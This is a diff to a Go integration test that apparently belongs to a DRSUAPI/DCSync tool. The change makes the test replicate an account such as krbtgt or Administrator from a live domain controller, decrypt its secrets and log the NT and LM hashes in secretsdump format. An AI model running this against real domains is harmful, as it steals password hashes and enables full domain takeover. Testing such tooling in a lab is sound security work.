@@ -73,14 +73,16 @@ func TestDRSBindUnbind(t *testing.T) {
 
 // TestCrackAndReplicate exercises the DCSync critical thread against a live DC: resolve a
 // target account to its objectGUID with IDL_DRSCrackNames, then replicate that single
-// object with IDL_DRSGetNCChanges (EXOP_REPL_OBJ). Attribute values are not decrypted
-// here (Phase 4); the test asserts the object came back with attributes. Requires
-// DRSUAPI_TEST_HOST and DRSUAPI_TEST_TARGET (an NT4-format account, e.g. "LAB\\krbtgt").
+// object with IDL_DRSGetNCChanges (EXOP_REPL_OBJ) and decrypt its secrets. Requires
+// DRSUAPI_TEST_HOST and a target: DRSUAPI_TEST_DN (a distinguished name, e.g.
+// "CN=Administrator,CN=Users,DC=lab,DC=local"; recommended — no NetBIOS name needed) or
+// DRSUAPI_TEST_TARGET (an NT4-format "DOMAIN\\user").
 func TestCrackAndReplicate(t *testing.T) {
 	host := os.Getenv("DRSUAPI_TEST_HOST")
+	dn := os.Getenv("DRSUAPI_TEST_DN")
 	target := os.Getenv("DRSUAPI_TEST_TARGET")
-	if host == "" || target == "" {
-		t.Skip("set DRSUAPI_TEST_HOST and DRSUAPI_TEST_TARGET (e.g. LAB\\krbtgt) to run")
+	if host == "" || (dn == "" && target == "") {
+		t.Skip("set DRSUAPI_TEST_HOST and DRSUAPI_TEST_DN (or DRSUAPI_TEST_TARGET) to run")
 	}
 	creds, err := credentials.NewCredentials(
 		os.Getenv("DRSUAPI_TEST_DOMAIN"), os.Getenv("DRSUAPI_TEST_USER"),
@@ -97,11 +99,15 @@ func TestCrackAndReplicate(t *testing.T) {
 	}
 	defer c.Close()
 
-	objGUID, err := c.ResolveToGUID(target, structures.DS_NT4_ACCOUNT_NAME)
-	if err != nil {
-		t.Fatalf("ResolveToGUID(%q): %v", target, err)
+	name, format := dn, structures.DS_FQDN_1779_NAME
+	if name == "" {
+		name, format = target, structures.DS_NT4_ACCOUNT_NAME
 	}
-	t.Logf("%s -> %s", target, objGUID.ToFormatD())
+	objGUID, err := c.ResolveToGUID(name, format)
+	if err != nil {
+		t.Fatalf("ResolveToGUID(%q): %v", name, err)
+	}
+	t.Logf("%s -> %s", name, objGUID.ToFormatD())
 
 	res, err := c.ReplicateSingleObject(objGUID)
 	if err != nil {
@@ -115,4 +121,18 @@ func TestCrackAndReplicate(t *testing.T) {
 	if len(obj.Attributes) == 0 {
 		t.Error("object returned with no attributes")
 	}
+
+	secrets, err := c.DecryptSecrets(res)
+	if err != nil {
+		t.Fatalf("DecryptSecrets: %v", err)
+	}
+	if len(secrets) == 0 {
+		t.Fatal("no secrets decrypted (object had no objectSid?)")
+	}
+	s := secrets[0]
+	if !s.HasNT {
+		t.Error("no NT hash decrypted for the target account")
+	}
+	// secretsdump-style line: sAMAccountName:RID:LMHash:NTHash:::
+	t.Logf("%s:%d:%x:%x:::", s.SAMAccountName, s.RID, s.LMHash, s.NTHash)
 }
